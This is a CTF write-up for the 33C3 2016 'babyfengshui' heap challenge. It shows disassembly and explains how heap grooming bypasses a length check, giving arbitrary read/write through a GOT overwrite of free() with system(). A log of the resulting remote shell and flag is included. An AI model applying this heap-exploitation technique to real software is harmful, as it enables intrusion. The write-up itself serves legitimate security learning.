## 33C3 CTF 2016 - babyfengshui (Pwn 150pt)
##### 27-29/12/2016 (48hr)
___
### Description
They asked me to write the best application to store our users profile, so I did, 
because I know how to do this stuff, because believe me, I am the absolute best when it comes
to memory management here, I will even let you try to hack it: 78.46.224.83:1456
___
### Solution
Binary has a simple menu for managing user entries:

```c
	puts("0: Add a user");
	puts("1: Delete a user");
	puts("2: Display a user");
	puts("3: Update a user description");
	puts("4: Exit");
```
The add_usr_8048816 function allocates 2 buffers in the heap: The first one (let A) is of user
specific size and the 2nd (let B) is 0x80 bytes long and contains 2 fields: A pointer to buffer A 
and a char array to hold up to 0x7c bytes of the name. A pointer to the second buffer is also 
stored in a global array in bss (let name_arr). After allocations, update_usr_8048724 is called, 
which is the option #3 in main menu. Let's take a closer look:

```assembly
.text:0804873B     movzx   eax, ds:counter_804B069
.text:08048742     cmp     [ebp+var_1C], al
.text:08048745     jnb     loc_80487FF                 ; index >= counter ?
.text:0804874B     movzx   eax, [ebp+var_1C]
.text:0804874F     mov     eax, ds:name_arr[eax*4]
.text:08048756     test    eax, eax
.text:08048758     jz      loc_8048802                 ; name_arr[ index ] == NULL?
.text:0804875E     mov     [ebp+var_10], 0
.text:08048765     sub     esp, 0Ch
.text:08048768     push    offset format               ; "text length: "
.text:0804876D     call    _printf
.text:08048772     add     esp, 10h
.text:08048775     sub     esp, 4
.text:08048778     lea     eax, [ebp+var_11]
.text:0804877B     push    eax
.text:0804877C     lea     eax, [ebp+var_10]
.text:0804877F     push    eax
.text:08048780     push    offset aUC                  ; "%u%c"
.text:08048785     call    ___isoc99_scanf
.text:0804878A     add     esp, 10h
.text:0804878D     movzx   eax, [ebp+var_1C]
.text:08048791     mov     eax, ds:name_arr[eax*4]
.text:08048798     mov     eax, [eax]
.text:0804879A     mov     edx, eax
.text:0804879C     mov     eax, [ebp+var_10]
.text:0804879F     add     edx, eax                    ; edx = name_arr[ index ][ size ]
.text:080487A1     movzx   eax, [ebp+var_1C]
.text:080487A5     mov     eax, ds:name_arr[eax*4]
.text:080487AC     sub     eax, 4                      ; eax = name_arr[ index ] - 4
.text:080487AF     cmp     edx, eax
.text:080487B1     jb      short loc_80487CD
.text:080487B3     sub     esp, 0Ch
.text:080487B6     push    offset s                    ; "my l33t defenses cannot be fooled, cya!"
.text:080487BB     call    _puts
.text:080487C0     add     esp, 10h
.text:080487C3     sub     esp, 0Ch
.text:080487C6     push    1                           ; status
.text:080487C8     call    _exit
.text:080487CD ; ---------------------------------------------------------------------------
.text:080487CD
.text:080487CD loc_80487CD:                            ; CODE XREF: update_usr_8048724+8Dj
.text:080487CD     sub     esp, 0Ch
.text:080487D0     push    offset aText                ; "text: "
.text:080487D5     call    _printf
.text:080487DA     add     esp, 10h
.text:080487DD     mov     eax, [ebp+var_10]
.text:080487E0     lea     edx, [eax+1]
.text:080487E3     movzx   eax, [ebp+var_1C]
.text:080487E7     mov     eax, ds:name_arr[eax*4]
.text:080487EE     mov     eax, [eax]
.text:080487F0     sub     esp, 8
.text:080487F3     push    edx
.text:080487F4     push    eax
.text:080487F5     call    get_str_80486BB
.text:080487FA     add     esp, 10h
.text:080487FD     jmp     short loc_8048803
```

First of all we check if name_arr[ counter - 1 ] is valid. If so, we ask for text length and
text. Here there's a check against overflows: 
```c
	if( (uint)&name_arr[counter - 1][ size ] >= (uint)name_arr[counter - 1] - 4 )
		// detect overflow
```

This check is enough to prevent overflows as long as these 2 buffers (A and B) are in
consecutive addresses. This could be true because calls to malloc() are consecutive as well.
However if we make program to allocate these 2 buffers with some gap between, we can
overflow everything between (our goal is to overwrite the pointer in buffer B). 

If we add 2 users of size 0x80, then delete the first user and add a 3rd user of size >0x80,
buffer A will be allocated at the top of the heap, but buffer B will be allocated below second
user. This way we can bypass the check and overflow buffer B of the 2nd user.

From then we have control over a pointer. We can leak any address we want by selecting option
2 (display user), and we can write at any memory address using option 3 (update user).

Then we work as follows: We leak an address from .got and we overwrite .got.free with
system(). Then we delete a user and we get a shell.

However things are not that simple. Please refer to the exploit file for more information.

```
ispo@nogirl:~/ctf/33c3_16$ ./babyfengshui_expl.py 
	[+] Leaking address of .got.free()...
	[+] free() at: 0xf76640f0
	[+] system() at: 0xf762c3e0
	[+] opening shell ...
		id
			uid=1000(fengshui) gid=1000(fengshui) groups=1000(fengshui)
		ls -la
			total 24
			drwxr-xr-x  2 root root 4096 Dec 26 22:00 .
			drwxr-xr-x 44 root root 4096 Dec 27 18:02 ..
			-rwx---r-x  1 root root 9728 Dec 26 21:50 babyfengshui
			-rwx---r--  1 root root   42 Dec 26 21:58 flag.txt
		date
			Wed Dec 28 14:31:19 UTC 2016
		cat flag.txt
			33C3_h34p_3xp3rts_c4n_gr00m_4nd_f3ng_shu1
		exit
	*** Connection closed by remote host ***
```

___